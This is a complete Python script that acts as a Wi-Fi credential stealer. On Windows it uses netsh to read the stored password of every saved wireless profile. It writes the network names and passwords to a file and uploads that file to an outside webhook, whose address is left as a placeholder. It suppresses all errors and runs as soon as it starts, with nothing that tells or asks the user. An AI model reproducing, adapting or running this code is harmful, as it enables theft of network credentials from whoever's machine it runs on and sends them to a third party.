import platform
import subprocess
import requests
import re
import os
webhook_url = "webh00k_here"

def check_os():
    return platform.system()

def W1F1():
    try:
        profiles_result = subprocess.run(["netsh", "wlan", "show", "profile"], capture_output=True, text=True, check=True)
        profiles = re.findall(r"All User Profile\s+:\s+(.*)", profiles_result.stdout)
        
        wifi_info = []

        for profile in profiles:
            profile_name = profile.strip()
            profile_details_result = subprocess.run(["netsh", "wlan", "show", "profile", profile_name], capture_output=True, text=True, check=True)
            password_search = re.search(r"Key Content\s+:\s+(.*)", profile_details_result.stdout)
            password = password_search.group(1).strip() if password_search else "No password found"
            
            wifi_info.append(f"SSID: {profile_name}, Password: {password}")

        with open("output.txt", "w") as f:
            for info in wifi_info:
                f.write(info + "\n")

        with open("output.txt", 'rb') as file:
            payload = {'content': 'User network info!'}
            files = {'file': file}
            response = requests.post(webhook_url, data=payload, files=files)
            
        if response.status_code == 204:
            pass  
        else:
            pass 

    except subprocess.CalledProcessError:
        pass  


def start():
    if check_os() == 'Windows':
        W1F1()
    else:
        payload = {'content': 'OS not supported'}
        requests.post(webhook_url, data=payload)

start()
